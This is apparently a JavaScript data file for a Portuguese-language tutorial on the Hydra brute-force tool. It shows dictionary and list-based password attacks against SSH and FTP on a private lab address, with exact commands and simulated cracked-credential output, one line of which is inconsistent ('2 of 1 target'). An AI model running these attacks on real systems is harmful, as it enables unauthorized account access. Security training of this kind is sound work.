
export const data = {
    id: "hydra",
    title: "Hydra: Ataque de Força Bruta Online",
    intro: "O Hydra é uma ferramenta rápida e flexível para quebrar logins (brute-force) em diversos protocolos como SSH, FTP, HTTP, SMB, entre outros.",
    steps: [
        {
            step: 1,
            instruction: "Vamos realizar um ataque de dicionário contra um servidor SSH (192.168.1.20). Sabemos que o usuário é 'admin', mas precisamos descobrir a senha usando a wordlist 'rockyou.txt'.",
            command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.20 ssh",
            hint: "-l define o login fixo, -P define a lista de senhas.",
            output: `Hydra v9.1 (c) 2020 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-10 16:00:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.20:22/
[22][ssh] host: 192.168.1.20   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-10 16:00:05`
        },
        {
            step: 2,
            instruction: "Agora vamos tentar um ataque contra um serviço FTP, mas desta vez testando múltiplos usuários e senhas (listas para ambos).",
            command: "hydra -L users.txt -P passwords.txt ftp://192.168.1.20",
            hint: "-L (maiúsculo) define lista de usuários. O protocolo pode ser passado no final da URL.",
            output: `Hydra v9.1 (c) 2020 by van Hauser/THC

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-10 16:05:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries
[DATA] attacking ftp://192.168.1.20:21/
[21][ftp] host: 192.168.1.20   login: user1   password: 123456
[21][ftp] host: 192.168.1.20   login: admin   password: admin
2 of 1 target successfully completed, 2 valid passwords found`
        }
    ]
};
